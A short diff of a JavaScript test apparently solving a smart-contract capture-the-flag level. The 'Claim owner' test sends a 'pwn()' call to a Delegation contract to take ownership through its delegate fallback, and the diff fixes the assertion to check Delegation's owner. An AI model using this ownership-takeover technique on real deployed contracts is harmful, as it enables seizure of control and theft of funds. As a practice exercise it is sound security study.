@@ -24,13 +24,13 @@ describe("Delegation", function () {
   it("Claim owner", async function () {
     const iface = new ethers.Interface(["function pwn()"]);
     const data = iface.encodeFunctionData("pwn");
-    const { Delegate, Delegation, user, owner } = store
+    const { Delegation, user } = store
     await user.sendTransaction({
       to: Delegation.target,
       data: data
     })
     console.log("user: ", user.address);
-    expect(await Delegate.owner()).to.eq(user.address)
+    expect(await Delegation.owner()).to.eq(user.address)
   });
   /*
   it("Withdraw balance", async function () {
